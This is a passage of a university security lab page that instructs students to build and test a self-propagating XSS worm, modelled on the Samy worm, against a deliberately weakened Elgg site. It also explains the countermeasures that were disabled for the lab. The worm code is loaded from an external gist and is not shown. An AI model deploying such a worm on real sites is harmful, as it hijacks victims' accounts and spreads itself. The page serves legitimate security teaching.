+<p>Why do we need line (1) in the code above?</p>
+
+<p>Remove this line, and repeat your attack. Report and explain your observation(s).</p>
+
+<h3 id="task-6-writing-a-self-propagating-xss-worm">Task 6: Writing a Self-Propagating XSS Worm</h3>
+
+<p>To become a real worm, the malicious JavaScript code should be able to propagate itself.
+Namely, whenever some people view an infected profile, not only will their profiles be modified,
+the worm will also be propagated to their profiles, further affecting others who view these newly infected profiles.
+Thus, the more people that view infected profiles, the faster the worm can propagate.
+This is exactly the same mechanism used by the Samy Worm:
+within just 20 hours of its October 4, 2005 release, over one million users were affected, making Samy one of the fastest spreading viruses of all time.
+The JavaScript code that can achieve this is called a <em>self-propagating cross-site scripting worm</em>.
+In this task, you need to implement such a worm, which not only modifies the victim’s profile and adds the user “Samy” as a friend,
+but also add a copy of the worm itself to the victim’s profile, so the victim is in essence turned into an attacker.</p>
+
+<p>To achieve self-propagation, when the malicious JavaScript modifies the victim’s profile, it should copy itself to the victim’s profile.
+</p>
+
+<p> For a walkthrough of this task: please watch  <a href="https://montana.hosted.panopto.com/Panopto/Pages/Viewer.aspx?id=86f2fe71-395d-4a0c-97a8-af3901850408">this video from Reese.</a></p>
+
+
+Consider the following code:
+
+<script src="https://gist.github.com/reesep/fa84275930681910ed85c42ffe662a2a.js"></script>
+
+From a high level, this code does two things. First, it issues an HTTP request to update the victims profile to say "Samy is my hero" followed by worm code itself (line 17). This HTTP request allows the worm to propagate, because we are now injecting our propagating payload into new victim profiles. 
+Second, it issues an HTTP request to add Samy as a friend. This is the same code as task 4.
+<br><br>
+Paste the worm code into the "about me" section of Samy's profile <B>NOTE:</B> Make sure you are updating the profile in "plaintext mode" (ie click on the "Edit HTML" button before pasting). If you use the visual editor, this attack will not work. 
+
+<br> <br>
+Log out of Samy's profile, and log in as Alice. Ensure your attack worked by seeing if Samy got added as a friend after visiting his profile. Then, log in as Boby and visit Alice's profile. You should see that Boby's profile is now infected. Remember to include screenshots for before/afterl
+
+
+
+
+<!-- BEGIN Special Section (Use Bootstrap "Card" Styles). This is nice for formatting background, setup, special instructions, etc. -->
+<div class="card bg-secondary border-primary">
+  <div class="card-body">
+
+    <h2 id="elggs-countermeasures">Elgg’s Countermeasures</h2>
+
+    <p>This aside is only for informational purposes, and there is no specific task to do.</p>
+
+    <p>In reality Elgg does have two effective countermeasures in place to defend against XSS attacks.
+As noted earlier, we have disabled/commented out these countermeaures to make your attacks possible.
+<!-- Actually, Elgg uses two countermeasures. --></p>
+
+    <h3 id="htmlawed">htmLawed</h3>
+
+    <p>One countermeasure consists of a custom security plugin, <a href="https://www.bioinformatics.org/phplabware/internal_utilities/htmLawed/">“htmLawed”</a>,
+which, on activation, validates user input and removes tags from the input.
+This specific plugin is registered to the function <code class="language-plaintext highlighter-rouge">filter_tags()</code> in the <code class="language-plaintext highlighter-rouge">input.php</code> file, which can be viewed on the <code class="language-plaintext highlighter-rouge">elgg-10.9.0.5</code> container.
+<!-- $ find / -name input.php -exec grep -nHA 3 'function filter_tags' 2> /dev/null {} \; -->
+<!-- $ grep -A 3 'function filter_tags' /var/www/elgg/vendor/elgg/elgg/engine/lib/input.php --></p>
+
+    <p>If we grep for the function in this file:</p>
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">grep</span> <span class="nt">-A</span> 3 <span class="s1">'function filter_tags'</span> /var/www/elgg/vendor/elgg/elgg/engine/lib/input.php
+</code></pre></div>    </div>
+    <p>we can clearly see that the relevant validation code has been commented out.</p>
+    <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">filter_tags</span><span class="p">(</span><span class="nx">$var</span><span class="p">)</span> <span class="p">{</span>
+	<span class="c1">// return elgg_trigger_plugin_hook('validate', 'input', null, $var);</span>
+	<span class="k">return</span> <span class="nx">$var</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>    </div>
+    <p><strong>To turn on this countermeasure</strong>,
+login to the application as admin,
+go to Account
+→ administration (top right)
+→ plugins (on the right panel),
+and then click on “security and spam” under the filter options at the top of the page.
+You should find the “HTMLawed” plugin here.
+Click “Activate” to enable the countermeasure.</p>
+
+    <h3 id="htmlspecialchars">htmlspecialchars</h3>
+
+    <p>In addition to the “HTMLawed” security plugin, there is another built-in PHP method called
+<a href="https://www.php.net/manual/en/function.htmlspecialchars.php">“htmlspecialchars”</a>,
+which is used to encode special characters included in user input;
+for example <code class="language-plaintext highlighter-rouge">&lt;</code> is encoded to <code class="language-plaintext highlighter-rouge">&amp;lt</code>, <code class="language-plaintext highlighter-rouge">&gt;</code> to <code class="language-plaintext highlighter-rouge">&amp;gt</code>, etc.</p>
+
+    <p><strong>To turn on this countermeasure</strong>,
+navigate to the following directory, and locate and uncomment calls to <code class="language-plaintext highlighter-rouge">htmlspecialchars()</code> in each file in this directory.
+<em>(The last time I checked, this function is called at various places in <code class="language-plaintext highlighter-rouge">url.php</code>, <code class="language-plaintext highlighter-rouge">text.php</code>, and <code class="language-plaintext highlighter-rouge">dropdown.php</code>.)</em></p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /var/www/elgg/vendor/elgg/elgg/views/default/output
+<span class="nb">grep</span> <span class="nt">-n</span> <span class="s1">'htmlspecialchars'</span> <span class="k">*</span>
+<span class="c"># --&gt; go into each file and uncomment calls to htmlspecialchars()</span>
+</code></pre></div>    </div>
+
+  </div>
+</div>
+<!-- END Special Section -->
+
+
+<h2 id="submission">Submission</h2>
+
+<p>Submit your assignment as a single PDF to the appropriate D2L dropbox</p>
+
+<br><br>
+
+The lab report is to help me see that you did the lab and followed the instructions. For each task, you should include a screenshot to show you completed the task. If the task asks you to write down observations, you should also include those in your lab report. For the tasks that requires you to do some thinking and find ways to exploit a program, you should write a brief description about your approach and the steps you took to get your output.
+
+This is a lab report taken from a previous offering of this course. This is a good example of how you should format your lab report: <a href="https://www.cs.montana.edu/pearsall/classes/fall2022/476/labs/SampleLabReportFormat.pdf">https://www.cs.montana.edu/pearsall/classes/fall2022/476/labs/SampleLabReportFormat.pdf</a>
+
+
+
+
+
+
+
+</div>
+
+</div>
+
+<div class="d-none d-xl-block col-xl-2">
+    
+    <nav id="toc" data-toggle="toc" class="sticky-top"></nav>
+    
+</div>
+
+</div>
+</div>
+
+<!-- Optional JavaScript for Bootstrap - jQuery first, then Popper.js, then Bootstrap JS -->
+<script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
+<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+
+<script src="../assets/prism.js"></script>
+
+<script src="https://cdn.rawgit.com/afeld/bootstrap-toc/v1.0.1/dist/bootstrap-toc.min.js"></script>
+
+<script>
+$(document).ready(function() {
+    /*
+     * class hacking: add bootstrap/bootswatch class labels to my custom classes (notes, slides, etc.)
+     */
+
+    // admin styles
+    $('.new').addClass('badge badge-pill badge-primary');
+    $('.announcement').addClass('alert alert-primary').prepend('<h4 class="alert-heading">Class Announcement!</h4>');
+    $('.timestamp').prepend('&mdash;Posted ');
+    // $('.score').prepend(' &mdash; ');
+
+    // add icons / style class elements...
+    $( ".activity" ).each(function(index) {
+        $(this).html('<i class="fas fa-lightbulb pl-1"></i> ' +$(this).html()+ '' );
+        $(this).attr('target', '_blank');
+    });
+    $( ".code" ).each(function(index) {
+        $(this).html('<i class="fas fa-file-code pl-1"></i> ' +$(this).html()+ '' );
+        $(this).attr('target', '_blank');
+    });
+    $( ".slides" ).each(function(index) {
+        $(this).html('<i class="fas fa-file-pdf pl-1"></i> ' +$(this).html()+ '' );
+        $(this).attr('target', '_blank');
+    });
+    $( ".pdf" ).each(function(index) {
+        $(this).html('<i class="fas fa-file pl-1"></i> ' +$(this).html()+ '' );
+        $(this).attr('target', '_blank');
+    });
+    $( ".reading" ).each(function(index) {
+        $(this).html('<i class="fas fa-book pl-1"></i> ' +$(this).html()+ '' );
+        $(this).attr('target', '_blank');
+    });
+    $( ".video" ).each(function(index) {
+        $(this).html('<i class="fas fa-play-circle pl-1"></i> ' +$(this).html()+ '' );
+        $(this).attr('target', '_blank');
+    });
+
+    // add links to all section headers...
+    $( ":header" ).each(function(index) {
+      var attr = $(this).attr('id');
+      if (typeof attr !== typeof undefined && attr !== false) {
+        $(this).html( '<a href="#' + attr + '">' +$(this).html()+ ' </a>' );
+      }
+    });
+
+    // add links to weeks on schedule
+    $('td[id^="week"]').filter(function () {
+        $(this).html(function(index, text){
+            return '<a href="#' + text.toLowerCase().replace(' ', '') + '"><strong>' + text + '</strong></a>';
+        });
+    });
+
+    // use javascript to detect all external links and add the target='_blank' attribute to them.
+    // -> thanks, https://code.luasoftware.com/tutorials/hugo/how-to-create-link-with-target-blanks-in-hugo-markdown/
+    var links = document.getElementsByTagName("a");
+    for (var i = 0, linksLength = links.length; i < linksLength; i++) {
+        if (links[i].hostname != window.location.hostname) {
+            links[i].target = '_blank';
+        }
+    }
+
+});
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    extensions: [
+      "MathMenu.js",
+      "MathZoom.js",
+      "AssistiveMML.js",
+      "a11y/accessibility-menu.js"
+    ],
+    jax: ["input/TeX", "output/CommonHTML"],
+    TeX: {
+      extensions: [
+        "AMSmath.js",
+        "AMSsymbols.js",
+        "noErrors.js",
+        "noUndefined.js",
+      ]
+    }
+  });
+  MathJax.Hub.Register.StartupHook("TeX Jax Ready",function () {
+    var TEX = MathJax.InputJax.TeX;
+    var COLS = function (W) {
+      var WW = [];
+      for (var i = 0, m = W.length; i < m; i++)
+        {WW[i] = TEX.Parse.prototype.Em(W[i])}
+      return WW.join(" ");
+    };
+    TEX.Definitions.Add({
+      environment: {
+        psmallmatrix: ['Array',null,'(',')','c',COLS([1/3]),".2em",'S',1],
+      }
+    });
+  });
+</script>
+<script type="text/javascript" async
+  src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js">
+</script>
+
+</body>
+
+</html>
